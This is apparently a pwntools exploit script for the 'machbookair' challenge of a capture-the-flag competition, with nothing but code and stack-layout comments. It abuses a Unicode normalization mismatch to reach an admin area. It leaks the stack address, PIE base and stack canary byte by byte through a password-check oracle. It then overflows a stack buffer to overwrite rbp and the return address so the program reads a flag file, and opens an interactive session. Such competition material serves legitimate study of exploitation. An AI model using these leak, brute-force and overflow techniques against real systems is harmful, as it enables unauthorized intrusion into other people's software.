#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return remote('localhost', 19091)
    return remote('machbookair.balsnctf.com', 19091)


# U+00E9.
ADMIN1 = b'\xc3\xa9'
ADMIN2 = b'\x65\xcc\x81'


# 0x7ffeefbff790: 0x0000000100000057 [[password]]   +0x00
# 0x7ffeefbff798: 0x0000000000000012                +0x08
# 0x7ffeefbff7a0: 0x00007fff6566c62e "'\n'"         +0x10
# 0x7ffeefbff7a8: 0x0000000000000001                +0x18
# 0x7ffeefbff7b0: 0x00007ffeefbff7c0                +0x20
# 0x7ffeefbff7b8: 0xa4d6adee66b200ee [[cookie #1]]  +0x28
# 0x7ffeefbff7c0: 0x0000003000000051 [[content]]    +0x00
# 0x7ffeefbff7c8: 0x00007ffeefbff810                +0x08
# 0x7ffeefbff7d0: 0x00007ffeefbff710                +0x10  -> 0x00007fff923cd5b0 libsystem_c.dylib`usual
# 0x7ffeefbff7d8: 0x0000000100003bef                +0x18  machbookair`___lldb_unnamed_symbol12$$machbookair + 95
# 0x7ffeefbff7e0: 0xa4d6adee66b200ee [[cookie #2]]  +0x20
# 0x7ffeefbff7e8: 0x0000000000000000                +0x28
# 0x7ffeefbff7f0: 0x0000000000000000
# 0x7ffeefbff7f8: 0xa4d6adee66b200ee [[actual cookie]]
# 0x7ffeefbff800: 0x00007ffeefbff830 [[rbp]]
# 0x7ffeefbff808: 0x0000000100003c95 [[ret]]               machbookair`___lldb_unnamed_symbol13$$machbookair + 149
# 0x7ffeefbff810: '../../flag'       [[TODO]]
def leak_stack_pie_cookie(tube):
    arr = bytearray(24)

    for i in range(len(arr)):
        tube.recvuntil(b'> ')
        tube.sendline(b'1')  # Create Post.
        tube.recvuntil(b'title: ')
        tube.sendline(ADMIN2)
        tube.recvuntil(b'content: ')
        content = b'2\n3\n'.ljust(0x27 - i, b'A')
        tube.send(content)

        tube.recvuntil(b'> ')
        tube.sendline(b'5')  # invalid choice.

        brute = b''
        for candidate in range(0x100):
            # Admin Area. The number of spaces is chosen so that when we
            # find the value, the rest of the input is gracefully consumed
            # (mostly by password: prompt) instead of sending the server
            # into scanf-induced infinite loop.
            brute += b'    3\n'
            password = content + bytes((candidate,)) + \
                       arr[len(arr) - i:] + b'\0'
            brute += password.ljust(0x2f, b'A')
        tube.send(brute)
        found = False
        for candidate in range(0x100):
            print(f'0x{candidate:02x}?')
            tube.recvuntil(b'> ')
            tube.recvuntil(b'password: ')
            delete_post = b'1. Delete Post'
            response = tube.recvuntil((b'unauthorized\n', delete_post))
            if response.endswith(delete_post):
                arr[len(arr) - 1 - i] = candidate
                print(f'Stack + PIE + Cookie: {arr.hex()}')
                found = True
        if not found:
            raise Exception('wtf')

        tube.recvuntil(b'> ')
        tube.sendline(b'3')  # Admin Area.
        tube.recvuntil(b'password: ')
        password = content + \
                   arr[len(arr) - 1 - i:] + b'\0'
        tube.send(password)

        tube.recvuntil(b'> ')
        tube.sendline(b'1')  # Delete Post.
        tube.recvuntil(b'title: ')
        tube.sendline(ADMIN2)
        tube.recvuntil(b'post removed\n')

        tube.recvuntil(b'> ')
        tube.sendline(b'2')  # Back.

    stack, pie = struct.unpack('<QQ', arr[:16])
    return stack, pie, arr[16:]


def test_cookie(tube, cookie):
    tube.recvuntil(b'> ')
    tube.sendline(b'1')  # Create Post.
    tube.recvuntil(b'title: ')
    tube.sendline(ADMIN2)
    tube.recvuntil(b'content: ')
    content = b'A' * 56 + cookie
    tube.send(content)

    tube.recvuntil(b'> ')
    tube.sendline(b'3')  # Admin Area.
    tube.recvuntil(b'password: ')
    tube.send(b'A' * 0x2f)
    tube.recvuntil(b'unauthorized\n')


def main():
    with connect() as tube:
        tube.recvuntil(b'admin: ')
        tube.sendline(ADMIN1)

        stack, pie, cookie = leak_stack_pie_cookie(tube)
        pie -= 0x3BEF
        print(f'Stack:  0x{stack:x}')
        print(f'PIE:    0x{pie:x}')
        print(f'Cookie: {cookie.hex()}')
        assert pie & 0xfff == 0
        test_cookie(tube, cookie)

        tube.recvuntil(b'> ')
        tube.sendline(b'1')  # Create Post.
        tube.recvuntil(b'title: ')
        tube.sendline(ADMIN2)
        tube.recvuntil(b'content: ')
        reference_stack = 0x7ffeefbff710
        reference_frame_addr = 0x7ffeefbff810
        frame_addr = stack + (reference_frame_addr - reference_stack)
        flag_addr = frame_addr + 0x50
        content = b'A' * 56 + cookie + struct.pack(
            '<QQ',
            flag_addr + 0x20,  # rbp
            pie + 0x35c3,
        ) + (b'A' * 0x50) + b'../../flag\0'
        tube.send(content)

        tube.recvuntil(b'> ')
        tube.sendline(b'3')  # Admin Area.
        tube.recvuntil(b'password: ')
        tube.send(b'A' * 0x2f)
        tube.recvuntil(b'unauthorized\n')

        tube.interactive()


if __name__ == '__main__':
    main()
